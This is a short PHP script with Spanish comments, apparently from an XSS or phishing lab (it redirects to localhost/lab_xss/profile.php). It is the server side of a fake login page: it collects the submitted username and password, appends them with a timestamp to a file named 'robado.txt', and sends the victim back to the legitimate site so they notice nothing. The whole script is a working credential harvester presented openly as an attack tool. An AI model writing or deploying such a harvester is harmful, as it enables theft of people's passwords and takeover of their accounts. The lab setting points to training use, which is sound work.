<?php
// Este script debe estar alojado en el servidor del atacante
// en la misma carpeta que fake_login.html.

// Recuperar las credenciales enviadas por el método POST
$username = $_POST['username'];
$password = $_POST['password'];

// Crear una cadena de texto con la información robada y la fecha/hora
$log_entry = "Credenciales robadas - " . date('Y-m-d H:i:s') . "\n";
$log_entry .= "Usuario: " . $username . "\n";
$log_entry .= "Contraseña: " . $password . "\n";
$log_entry .= "---------------------------------\n";

// Guardar las credenciales en un archivo de texto llamado 'robado.txt'
// El flag FILE_APPEND añade el contenido al final del archivo si ya existe.
file_put_contents('robado.txt', $log_entry, FILE_APPEND);

// Opcional: Redirigir a la víctima de vuelta al sitio legítimo para no levantar sospechas
// Asegúrate de que esta URL sea la del sitio real.
header('Location: http://localhost/lab_xss/profile.php');
exit();
?>

